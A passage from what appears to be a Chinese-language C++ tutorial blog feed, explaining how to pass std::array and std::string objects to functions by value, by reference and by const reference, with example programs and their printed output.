<span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : arr) &#123;</span><br><span class="line">        sum += x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 或者使用 std::accumulate(arr.begin(), arr.end(), 0.0);</span></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">double</span> total = sum_array_value(data);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始 array 未改变</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum calculated by value: &quot;</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call, data[0] &#x3D; 1.1</span><br><span class="line">Inside function (value): Modifying copy...</span><br><span class="line">After call, data[0] &#x3D; 1.1</span><br><span class="line">Sum calculated by value: 1015.4</span><br></pre></td></tr></table></figure><p><strong>按值传递 <code>std::array</code> 的问题:</strong></p><p>与 <code>std::string</code> 和大型结构体类似，如果 <code>std::array</code> 很大，按值传递会复制整个数组内容，导致性能开销。</p><h2 id="按引用传递-std-array"><a href="#按引用传递-std-array" class="headerlink" title="按引用传递 std::array"></a>按引用传递 <code>std::array</code></h2><p>为了避免复制开销并允许函数修改原始 <code>array</code> 对象，可以使用**按引用传递 (Pass by Reference)**。</p><p><strong>示例：按引用传递 <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按引用接收 array 对象，并将所有元素乘以因子</span></span><br><span class="line"><span class="comment">// arr_ref 是 data 的别名</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_array_ref</span><span class="params">(FiveDoubles&amp; arr_ref, <span class="keyword">double</span> factor)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (reference): Scaling original array...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span>&amp; x : arr_ref) &#123; <span class="comment">// 使用引用访问元素以修改它们</span></span><br><span class="line">        x *= factor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : data) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    scale_array_ref(data, <span class="number">10.0</span>); <span class="comment">// 传递引用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : data) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 原始 array 已被修改</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before call: 1 2 3 4 5</span><br><span class="line">Inside function (reference): Scaling original array...</span><br><span class="line">After call: 10 20 30 40 50</span><br></pre></td></tr></table></figure><h2 id="按常量引用传递-std-array-推荐方式"><a href="#按常量引用传递-std-array-推荐方式" class="headerlink" title="按常量引用传递 std::array (推荐方式)"></a>按常量引用传递 <code>std::array</code> (推荐方式)</h2><p>如果函数只需要读取 <code>array</code> 的内容而不需要修改它，最佳实践是使用**按常量引用传递 (Pass by Constant Reference)**。这提供了效率（避免复制）和安全性（防止修改）。</p><p><strong>示例：按常量引用传递 <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按常量引用接收 array 对象，并打印它</span></span><br><span class="line"><span class="comment">// arr_cref 是 data 的常量别名</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_array_const_ref</span><span class="params">(<span class="keyword">const</span> FiveDoubles&amp; arr_cref)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (const reference): Array elements are: &quot;</span>;</span><br><span class="line">    <span class="comment">// arr_cref[0] = 0.0; // 错误！不能通过常量引用修改</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : arr_cref) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Size: &quot;</span> &lt;&lt; arr_cref.size() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    print_array_const_ref(data); <span class="comment">// 传递常量引用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原始 array 未改变</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back in main, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Inside function (const reference): Array elements are: 1.1 2.2 3.3 4.4 5.5 (Size: 5)</span><br><span class="line">Back in main, data[0] &#x3D; 1.1</span><br></pre></td></tr></table></figure><p><strong>总结传递方式:</strong></p><ul><li>  <strong>按值 (<code>std::array&lt;T, N&gt; arr</code>)</strong>: 创建副本，安全但可能低效。</li><li>  <strong>按引用 (<code>std::array&lt;T, N&gt;&amp; arr</code>)</strong>: 不创建副本，高效，允许修改。</li><li>  <strong>按常量引用 (<code>const std::array&lt;T, N&gt;&amp; arr</code>)</strong>: 不创建副本，高效，不允许修改。<strong>这是将 <code>array</code> 传递给函数进行只读访问的最常用和推荐的方式。</strong></li></ul><h2 id="返回-std-array-对象"><a href="#返回-std-array-对象" class="headerlink" title="返回 std::array 对象"></a>返回 <code>std::array</code> 对象</h2><p>函数也可以返回 <code>std::array</code> 对象，通常按值返回。与 <code>std::string</code> 类似，编译器通常会应用 RVO/NRVO 来优化掉返回时的复制操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // for std::pow</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> ThreeInts = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, <span class="number">3</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：创建一个包含 x, x^2, x^3 的 array 并返回</span></span><br><span class="line"><span class="function">ThreeInts <span class="title">create_powers</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    ThreeInts result;</span><br><span class="line">    result[<span class="number">0</span>] = x;</span><br><span class="line">    result[<span class="number">1</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="built_in">std</span>::<span class="built_in">pow</span>(x, <span class="number">2</span>));</span><br><span class="line">    result[<span class="number">2</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="built_in">std</span>::<span class="built_in">pow</span>(x, <span class="number">3</span>));</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// 返回 array 对象 (通常会被优化)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ThreeInts powers_of_5 = create_powers(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Powers of 5: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> val : powers_of_5) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出: 5 25 125</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>与 C 风格数组的比较:</strong></p><p>使用 <code>std::array</code> 与函数交互比使用 C 风格数组更优越：</p><ul><li>  <strong>大小是类型的一部分:</strong> 函数签名明确指定了期望的数组大小，提高了类型安全。例如，不能将 <code>std::array&lt;int, 5&gt;</code> 传递给期望 <code>std::array&lt;int, 10&gt;</code> 的函数。</li><li>  <strong>无指针退化:</strong> <code>std::array</code> 不会退化为指针，避免了相关的混淆和错误。</li><li>  <strong>传递方式明确:</strong> 像普通对象一样按值、按引用或按常量引用传递，语义清晰。</li><li>  <strong>接口更丰富:</strong> 可以直接在函数内部使用 <code>size()</code>, <code>at()</code> 等成员函数。</li></ul><p>因此，在需要固定大小数组的场景下，<code>std::array</code> 通常是比 C 风格数组更好的选择，尤其是在函数参数和返回值中使用时。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.7 函数和 string 对象</title>
      <link href="2025/04/26/7.7_%E5%87%BD%E6%95%B0%E5%92%8Cstring%E5%AF%B9%E8%B1%A1/"/>
      <url>2025/04/26/7.7_%E5%87%BD%E6%95%B0%E5%92%8Cstring%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p>C++ 标准库提供的 <code>std::string</code> 类是处理字符串的现代、更安全、更方便的方式，它与 C-风格字符串（字符数组）有很大不同。将 <code>std::string</code> 对象传递给函数或从函数返回它们，其行为更像结构体，但也受益于 C++ 的引用特性。</p><h2 id="传递-std-string-对象"><a href="#传递-std-string-对象" class="headerlink" title="传递 std::string 对象"></a>传递 <code>std::string</code> 对象</h2><p>与结构类似，<code>std::string</code> 对象默认也是<strong>按值传递 (Pass by Value)**。这意味着当将一个 <code>string</code> 对象传递给函数时，会创建该对象的一个</strong>副本**。</p><p><strong>示例：按值传递 <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 包含 string 头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按值接收 string 对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_string_value</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> str)</span> </span>&#123; <span class="comment">// str 是 message 的副本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (value): \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 修改副本，不影响原始 string</span></span><br><span class="line">    str[<span class="number">0</span>] = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified copy inside function: \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_string_value(message);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始 string 未改变</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call: &quot;Hello&quot;</span><br><span class="line">Inside function (value): &quot;Hello&quot;</span><br><span class="line">Modified copy inside function: &quot;Jello&quot;</span><br><span class="line">After call: &quot;Hello&quot;</span><br></pre></td></tr></table></figure><p><strong>按值传递 <code>std::string</code> 的问题:</strong></p><p>虽然按值传递可以保护原始数据，但 <code>std::string</code> 对象可能存储很长的字符串。每次调用函数都复制整个字符串（包括其内部可能动态分配的内存）可能会导致显著的性能开销。</p><h2 id="按引用传递-std-string"><a href="#按引用传递-std-string" class="headerlink" title="按引用传递 std::string"></a>按引用传递 <code>std::string</code></h2><p>为了避免复制开销并允许函数修改原始 <code>string</code> 对象，可以使用**按引用传递 (Pass by Reference)**。</p><p><strong>示例：按引用传递 <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按引用接收 string 对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_string_ref</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>&amp; str_ref)</span> </span>&#123; <span class="comment">// str_ref 是 message 的别名</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (reference): \&quot;&quot;</span> &lt;&lt; str_ref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 修改引用，会直接修改原始 string</span></span><br><span class="line">    str_ref += <span class="string">&quot; World&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified original via reference: \&quot;&quot;</span> &lt;&lt; str_ref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    modify_string_ref(message); <span class="comment">// 传递引用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始 string 已被修改</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call: &quot;Hello&quot;</span><br><span class="line">Inside function (reference): &quot;Hello&quot;</span><br><span class="line">Modified original via reference: &quot;Hello World&quot;</span><br><span class="line">After call: &quot;Hello World&quot;</span><br></pre></td></tr></table></figure><h2 id="按常量引用传递-std-string-推荐方式"><a href="#按常量引用传递-std-string-推荐方式" class="headerlink" title="按常量引用传递 std::string (推荐方式)"></a>按常量引用传递 <code>std::string</code> (推荐方式)</h2><p>如果函数需要读取 <code>string</code> 的内容但不需要修改它，最佳实践是使用**按常量引用传递 (Pass by Constant Reference)**。这提供了按引用传递的效率（避免复制），同时具有按值传递的安全性（防止函数修改原始数据）。</p><p><strong>示例：按常量引用传递 <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按常量引用接收 string 对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_string_const_ref</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; str_cref)</span> </span>&#123; <span class="comment">// str_cref 是 message 的常量别名</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (const reference): \&quot;&quot;</span> &lt;&lt; str_cref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// str_cref[0] = &#x27;J&#x27;; // 错误！不能通过常量引用修改对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String length: &quot;</span> &lt;&lt; str_cref.length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello C++&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_string_const_ref(message); <span class="comment">// 传递常量引用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 原始 string 未改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以传递字符串字面值，它们会自动转换为临时的 string 对象</span></span><br><span class="line">    display_string_const_ref(<span class="string">&quot;Temporary String&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Before call: &quot;Hello C++&quot;</span><br><span class="line">Inside function (const reference): &quot;Hello C++&quot;</span><br><span class="line">String length: 9</span><br><span class="line">After call: &quot;Hello C++&quot;</span><br><span class="line">Inside function (const reference): &quot;Temporary String&quot;</span><br><span class="line">String length: 16</span><br></pre></td></tr></table></figure><p><strong>总结传递方式:</strong></p><ul><li>  <strong>按值 (<code>std::string str</code>)</strong>: 创建副本，安全但可能低效。</li><li>  <strong>按引用 (<code>std::string&amp; str</code>)</strong>: 不创建副本，高效，允许修改原始对象。</li><li>  <strong>按常量引用 (<code>const std::string&amp; str</code>)</strong>: 不创建副本，高效，不允许修改原始对象。<strong>这是将字符串传递给函数进行只读访问的最常用和推荐的方式。</strong></li></ul><h2 id="返回-std-string-对象"><a href="#返回-std-string-对象" class="headerlink" title="返回 std::string 对象"></a>返回 <code>std::string</code> 对象</h2><p>函数也可以返回 <code>std::string</code> 对象。通常直接按值返回即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：创建一个问候语字符串并返回</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">create_greeting</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; name)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> result = <span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// 返回 string 对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> user_name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting = 